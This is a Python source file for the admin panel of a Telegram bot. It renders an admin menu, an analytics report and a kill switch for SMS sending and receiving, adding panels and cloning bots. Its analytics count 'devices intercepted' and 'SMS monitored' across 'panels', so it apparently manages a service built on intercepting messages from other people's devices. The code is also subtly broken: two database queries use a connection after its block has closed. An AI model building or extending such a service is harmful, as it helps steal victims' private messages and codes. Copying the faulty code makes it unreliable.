import logging
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes, ConversationHandler, CommandHandler, MessageHandler, CallbackQueryHandler, filters
from bot.middlewares.auth_check import admin_only
from bot.models.user_model import search_users, update_user_points, set_user_ban_status
from bot.models.settings_model import get_setting, set_setting
from bot.database import db

logger = logging.getLogger(__name__)

# Conversation state
AWAITING_BROADCAST = 1

@admin_only
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Renders the Super Admin Panel.
    """
    keyboard = [
        [InlineKeyboardButton("👥 Users", callback_data="adm_users"),
         InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton("📊 Analytics", callback_data="adm_analytics"),
         InlineKeyboardButton("🤖 Clone Bots", callback_data="adm_clones")],
        [InlineKeyboardButton("⚙️ Bot Settings", callback_data="adm_settings"),
         InlineKeyboardButton("📝 Logs", callback_data="adm_logs")],
        [InlineKeyboardButton("💰 Points Mgmt", callback_data="adm_points"),
         InlineKeyboardButton("🔒 Kill Switch", callback_data="adm_killswitch")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg_text = "🛡️ **SUPER ADMIN PANEL — CONTROL CENTER**\n\nWelcome back Admin. Select a subsystem node to manage:"
    
    if update.callback_query:
        await update.callback_query.edit_message_text(msg_text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(msg_text, reply_markup=reply_markup)

@admin_only
async def analytics_view(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Section 5: Advanced Analytics (Formatted, eye-catching report query).
    """
    query = update.callback_query
    await query.answer()
    
    if not db.pool:
        await query.edit_message_text("Database pool not active.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="admin_menu")]]))
        return
        
    try:
        async with db.pool.acquire() as conn:
            tot_users = await conn.fetchval("SELECT COUNT(*) FROM users")
            banned_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE is_banned = TRUE")
            vip_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE is_vip = TRUE")
            
            tot_clones = await conn.fetchval("SELECT COUNT(*) FROM clone_bots")
            active_clones = await conn.fetchval("SELECT COUNT(*) FROM clone_bots WHERE is_active = TRUE")
            expired_clones = tot_clones - active_clones
            
            tot_panels = await conn.fetchval("SELECT COUNT(*) FROM panels")
            valid_panels = await conn.fetchval("SELECT COUNT(*) FROM panels WHERE is_valid = TRUE")
            
        sms_sent = await conn.fetchval("SELECT SUM(sms_count) FROM panels") or 0
        devices_intercepted = await conn.fetchval("SELECT SUM(devices_count) FROM panels") or 0
            
        sum_points = await conn.fetchval("SELECT SUM(points) FROM users") or 0
        spent_points = sum_points # Placeholder

        text = (
            f"╔══════════════════════════════════════╗\n"
            f"║       📊 SYSTEM ANALYTICS            ║\n"
            f"╠══════════════════════════════════════╣\n"
            f"║                                      ║\n"
            f"║  👥 Total Users:        `{tot_users}`\n"
            f"║  ✅ Active:             `{tot_users - banned_users}`\n"
            f"║  🚫 Banned:               `{banned_users}`\n"
            f"║  ⭐ VIP:                  `{vip_users}`\n"
            f"║                                      ║\n"
            f"║  🤖 Clone Bots:                      ║\n"
            f"║     Active:               `{active_clones}`\n"
            f"║     Expired:               `{expired_clones}`\n"
            f"║                                      ║\n"
            f"║  📋 Panels:                          ║\n"
            f"║     Total Added:          `{tot_panels}`\n"
            f"║     Valid/Working:        `{valid_panels}`\n"
            f"║     Invalid:               `{tot_panels - valid_panels}`\n"
            f"║                                      ║\n"
            f"║  📨 Devices Found:        `{devices_intercepted}`\n"
            f"║  📤 SMS Monitored:         `{sms_sent}`\n"
            f"║                                      ║\n"
            f"║  💰 Points Economy:                  ║\n"
            f"║     In Circulation:     `{sum_points}`\n"
            f"║                                      ║\n"
            f"╚══════════════════════════════════════╝"
        )
    except Exception as e:
        logger.error(f"Error fetching stats: {e}")
        text = f"❌ Error executing aggregate checks: {e}"

    keyboard = [[InlineKeyboardButton("⬅️ Back to Admin Panel", callback_data="admin_menu")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

@admin_only
async def admin_kill_switch_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Renders Admin Kill Switch & Soft maintenance options (Section 5).
    """
    query = update.callback_query
    await query.answer()
    
    sys_enabled = await get_setting("system_enabled", True)
    f_send = await get_setting("f_send_sms", True)
    f_recv = await get_setting("f_recv_sms", True)
    f_panel = await get_setting("f_add_panel", True)
    f_clone = await get_setting("f_clone_bot", True)
    
    sys_emoji = "🟢 ACTIVE" if sys_enabled else "🔴 INACTIVE/MAINTENANCE"
    
    text = (
        f"🔒 **ADMIN KILL SWITCH CONFIGURATION**\n\n"
        f"Current Status: {sys_emoji}\n\n"
    )
    
    keyboard = []
    
    if sys_enabled:
        keyboard.append([InlineKeyboardButton("🔴 DISABLE ENTIRE SYSTEM", callback_data="killsys_disable")])
    else:
        keyboard.append([InlineKeyboardButton("🟢 RE-ENABLE SYSTEM", callback_data="killsys_enable")])
        
    on = "(ON)"
    off = "(OFF)"
    
    keyboard.append([InlineKeyboardButton(f"📨 Send SMS {on if f_send else off}", callback_data="killsys_f-send-sms")])
    keyboard.append([InlineKeyboardButton(f"📥 Receive SMS {on if f_recv else off}", callback_data="killsys_f-recv-sms")])
    keyboard.append([InlineKeyboardButton(f"📋 Add Panel {on if f_panel else off}", callback_data="killsys_f-add-panel")])
    keyboard.append([InlineKeyboardButton(f"🤖 Clone Bot {on if f_clone else off}", callback_data="killsys_f-clone-bot")])
        
    keyboard.append([InlineKeyboardButton("⬅️ Back to Admin Panel", callback_data="admin_menu")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

@admin_only
async def handle_killswitch_toggle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Processes the toggle action from Kill Switch.
    """
    query = update.callback_query
    await query.answer()
    
    action = query.data.split("_")[1]
    
    if action == "enable":
         await set_setting("system_enabled", True)
         await query.answer("System enabled.", show_alert=True)
    elif action == "disable":
         await set_setting("system_enabled", False)
         await query.answer("System disabled.", show_alert=True)
    elif action.startswith("f-"):
         key = action.replace("-", "_")
         current = await get_setting(key, True)
         await set_setting(key, not current)
         await query.answer(f"Toggle {'disabled' if current else 'enabled'}.", show_alert=True)
         
    await admin_kill_switch_menu(update, context)

# --- ADVANCED BROADCAST IS IN handlers/admin/broadcast_flow.py ---
